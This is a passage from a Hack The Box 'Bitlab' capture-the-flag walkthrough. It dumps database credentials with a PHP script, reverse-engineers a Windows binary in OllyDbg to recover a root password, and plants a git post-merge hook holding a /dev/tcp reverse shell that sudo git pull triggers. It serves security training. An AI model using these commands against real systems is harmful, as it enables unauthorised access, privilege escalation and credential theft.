+<span class="cp">&lt;?php</span>
+<span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=localhost dbname=profiles user=profiles password=p.....s"</span><span class="p">);</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">"SELECT * FROM profiles"</span><span class="p">);</span></code></pre></figure>
+
+<p>Let’s use this info from our newly obtained shell to grab data from the database using our own <code class="highlighter-rouge">PHP</code> script. Hopefully we can find some juicy info.</p>
+
+<p>Here we find that <code class="highlighter-rouge">/var/www/html/profile</code> is owned by <code class="highlighter-rouge">root</code> so let’s <code class="highlighter-rouge">cd /tmp</code> and write our script there:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">"host=localhost dbname=profiles user=profiles password=p.....s"</span><span class="p">);</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">"SELECT * FROM profiles"</span><span class="p">);</span>
+
+<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">pg_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> 
+<span class="p">{</span>
+        <span class="nv">$count</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
+        <span class="nv">$y</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="nv">$y</span> <span class="o">&lt;</span> <span class="nv">$count</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="nv">$c_row</span> <span class="o">=</span> <span class="nb">current</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
+                <span class="k">echo</span> <span class="s1">' | '</span> <span class="o">.</span> <span class="nv">$c_row</span> <span class="o">.</span> <span class="s1">' | '</span><span class="p">;</span>
+                <span class="nb">next</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
+                <span class="nv">$y</span> <span class="o">=</span> <span class="nv">$y</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nb">pg_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">" "</span>  <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Then we can execute the file and see what we have got:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">php db.php
+| 1 |  | clave |  | c3NoL...wQHNz<span class="o">==</span> |</code></pre></figure>
+
+<p>Looks like more credentials. At first I thought that the password was <code class="highlighter-rouge">base64</code> encoding as it decodes to the string <code class="highlighter-rouge">ssh-str0ng-p@ss</code>. However, the password is just disguised as one potentially for a rabbithole affect. We can simply login with the password as is:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh clave@bitlab.htb
+clave@bitlab.htb password: 
+Last login: Thu Aug  8 14:40:09 2019
+clave@bitlab:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+1e3fd81ec3....e3c20b8154</code></pre></figure>
+
+<p>We take yet another <code class="highlighter-rouge">user.txt</code> flag! Time for <code class="highlighter-rouge">root</code>.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Looking in <code class="highlighter-rouge">clave</code>’s home directory we find a file called <code class="highlighter-rouge">RemoteConnection.exe</code>.</p>
+
+<p>Let’s download it:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">scp clave@bitlab.htb:/home/clave/RemoteConnection.exe .</code></pre></figure>
+
+<p>And then have a look at it with a <code class="highlighter-rouge">debugger</code>.</p>
+
+<h3 id="debugging">Debugging</h3>
+
+<p>Open up <code class="highlighter-rouge">ollydbg</code> and go to <code class="highlighter-rouge">File -&gt; Open</code> in the top menu navigating to <code class="highlighter-rouge">RemoteConnection.exe</code> and selecting it.</p>
+
+<p>Once loaded, depending on your layout, we should see the following:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_RemoteConnection.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_RemoteConnection.png" alt="Bitlab OllyDBG Screenshot" class="img-fluid"></a></p>
+
+<p>If you are missing the <code class="highlighter-rouge">Executable modules</code> and <code class="highlighter-rouge">References</code> windows you can open them by going to <code class="highlighter-rouge">View</code> in the top menu:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_view-menu.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_view-menu.png" alt="Bitlab OllyDBG View Screenshot" class="img-fluid"></a></p>
+
+<p>Check that the <code class="highlighter-rouge">CPU</code> window is on module <code class="highlighter-rouge">RemoteCo</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_module.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_module.png" alt="Bitlab OllyDBG Module Screenshot" class="img-fluid"></a></p>
+
+<p>If it isn’t double click <code class="highlighter-rouge">RemoteConnection.exe</code> from the <code class="highlighter-rouge">Executable modules</code> window.</p>
+
+<p>In the <code class="highlighter-rouge">CPU</code> window right click and select <code class="highlighter-rouge">Search for -&gt; All referenced text strings</code> from the context menu:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_search-for.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_search-for.png" alt="Bitlab OllyDBG Search For Screenshot" class="img-fluid"></a></p>
+
+<h4 id="strings">Strings</h4>
+
+<p>We should see a list appear in the <code class="highlighter-rouge">References</code> window showing a bunch of strings:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_references.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_references.png" alt="Bitlab OllyDBG References Screenshot" class="img-fluid"></a></p>
+
+<p>Here we can see an ASCII string which looks interesting:</p>
+
+<p><code class="highlighter-rouge">ASCII "XRIBG0UCDh0HJRcIBh8EEk8aBwdQTAIERVIwFEQ4SDghJUsHJTw1TytWFkwPVgQ2RztS"</code></p>
+
+<p>This looked like it could potentially be a password but on checking this was not the case. Would have been too easy!</p>
+
+<p>At a closer look we see <code class="highlighter-rouge">UNICODE "clave"</code> which we know is a <code class="highlighter-rouge">username</code> used on the system and then a mention of <code class="highlighter-rouge">UNICODE "C:\Program Files\PuTTY\putty.exe"</code> which is an <em>SSH</em> client. Given the name of the file <code class="highlighter-rouge">RemoteConnection.exe</code> we can safely assume that this program is meant to connect to <code class="highlighter-rouge">bitlab</code> and most likely as <code class="highlighter-rouge">root</code>.</p>
+
+<p>We look at the <code class="highlighter-rouge">Disassembly</code> section related to <code class="highlighter-rouge">UNICODE "clave"</code> and see <code class="highlighter-rouge">CMP</code> which stands for <code class="highlighter-rouge">compare</code>. We like comparisons as that’s usually where interesting things happen.</p>
+
+<h4 id="breaking">Breaking</h4>
+
+<p>Let’s set a <code class="highlighter-rouge">breakpoint</code> and see whats going on. While the string <code class="highlighter-rouge">UNICODE "clave"</code> is selected press <code class="highlighter-rouge">F2</code>. We will see the address <code class="highlighter-rouge">00401640</code> highlighted in red showing that we have created a <code class="highlighter-rouge">breakpoint</code> for that location:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_breakpoint.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_breakpoint.png" alt="Bitlab OllyDBG Breakpoint Screenshot" class="img-fluid"></a></p>
+
+<p>To run the <code class="highlighter-rouge">Debug</code> press <code class="highlighter-rouge">F9</code> which brings us to our <code class="highlighter-rouge">breakpoint</code>.</p>
+
+<p>Looking under the <code class="highlighter-rouge">Registers</code> section we uncover what we are looking for:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_root.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/ollydbg_root.png" alt="Bitlab OllyDBG Root Password Screenshot" class="img-fluid"></a></p>
+
+<p>We can now log in to <code class="highlighter-rouge">root</code> with the password <code class="highlighter-rouge">Qf7].........[7d?j&amp;eD4^</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh root@bitlab.htb
+root@bitlab.htb password: 
+root@bitlab:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@bitlab:~# <span class="nb">cat </span>root.txt
+8d4cc13175....cddccd587c</code></pre></figure>
+
+<p>And there we have it… Another box rooted!!</p>
+
+<h2 id="alternate-root">Alternate Root</h2>
+
+<p>If you take a look at the beginning of this writeup I stated <em>“tests your knowledge in Git, basic privilege escalation <strong>or</strong> Reverse Engineering/Debugging techniques”</em>. Maybe you noticed it? Or maybe not!</p>
+
+<p>Remember back when we found the <em>exploitable script</em> that used <code class="highlighter-rouge">sudo git pull</code> I also stated <em>“potentially even a leap straight to <strong>root</strong>“</em>?</p>
+
+<p>I know, I know! I’m sorry! But in my defence I wanted you to go through the <em>Debugging</em> way first.</p>
+
+<p>Rewinding back to when we gained our <code class="highlighter-rouge">foothold</code> with the user <code class="highlighter-rouge">www-data</code> and we went in to the <code class="highlighter-rouge">/tmp</code> to write our <em>PHP</em> script we could of done something a whole lot simpler.</p>
+
+<h3 id="git-hooks">Git Hooks</h3>
+
+<p>In researching exploits for <code class="highlighter-rouge">git pull</code> I came across this <a href="https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/">post</a>. I decided that <code class="highlighter-rouge">githooks</code> was going to be my attack method.</p>
+
+<p>With further research I found the hook <a href="https://git-scm.com/docs/githooks#_post_merge">post-merge</a> which is invoked by <code class="highlighter-rouge">git-merge</code> which happens when a <code class="highlighter-rouge">git pull</code> is done on a local repository. This fits all our criteria.</p>
+
+<p>Now the issue here is that we can’t just add a <code class="highlighter-rouge">hook</code> to the <code class="highlighter-rouge">.git</code> folder in the repository because:</p>
+
+<ol>
+  <li>
+<em>Gitlab</em> doesn’t allow it.</li>
+  <li>
+<code class="highlighter-rouge">/var/www/html/profile</code> is owned by <code class="highlighter-rouge">root</code>.</li>
+</ol>
+
+<p>To combat this we will just recreate the <code class="highlighter-rouge">profile</code> repository so we do have ownership.</p>
+
+<p>Being in <code class="highlighter-rouge">/tmp</code> we will copy the <code class="highlighter-rouge">profile</code> repository to this location and then traverse in to it:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cp</span> <span class="nt">-r</span> /var/www/html/profile/ profile <span class="o">&amp;&amp;</span> <span class="nb">cd </span>profile</code></pre></figure>
+
+<p>We will then create our <code class="highlighter-rouge">payload</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> .git/hooks/post-merge <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/6969 0&gt;&amp;1'</span> <span class="o">&gt;&gt;</span> .git/hooks/post-merge</code></pre></figure>
+
+<p>And make the file executable:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">chmod</span> +x .git/hooks/post-merge</code></pre></figure>
+
+<p>Next we get our listener ready on the <code class="highlighter-rouge">attacker</code> machine:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 6969</code></pre></figure>
+
+<p>Now all thats left to do is alter a file in the <code class="highlighter-rouge">profile</code> repository on <em>Gitlab</em>.</p>
+
+<p>From there we <code class="highlighter-rouge">commit the changes</code>, <code class="highlighter-rouge">submit a merge request</code> and <code class="highlighter-rouge">merge</code>.</p>
+
+<p>Once that is done we can <code class="highlighter-rouge">pull</code> in the changes to our own repository:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">sudo </span>git pull</code></pre></figure>
+
+<p>We should then receive a connection at our <code class="highlighter-rouge">netcat</code> session:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.114.
+Ncat: Connection from 10.10.10.114:50644.
+root@bitlab:/tmp/profile# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@bitlab:/tmp/profile# <span class="nb">cat</span> /root/root.txt
+<span class="nb">cat</span> /root/root.txt
+8d4cc13175....cddccd587c</code></pre></figure>
+
+<p>There we have it <code class="highlighter-rouge">www-data -&gt; root</code>.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>The initial foothold once again shows how the misconfiguration of a website can cause a ripple all the way to a system breach. Once compromised the misconfiguration of tools like <code class="highlighter-rouge">sudo</code> allow execution of a command that can cause <em>privilege escalation</em> to <code class="highlighter-rouge">root</code> quite easily. To avoid such things don’t misconfigure a link to direct to your personal bookmarks which weirdly contains javascript code that holds your username and password <img class="emoji" title=":laughing:" alt=":laughing:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png" height="20" width="20"></p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
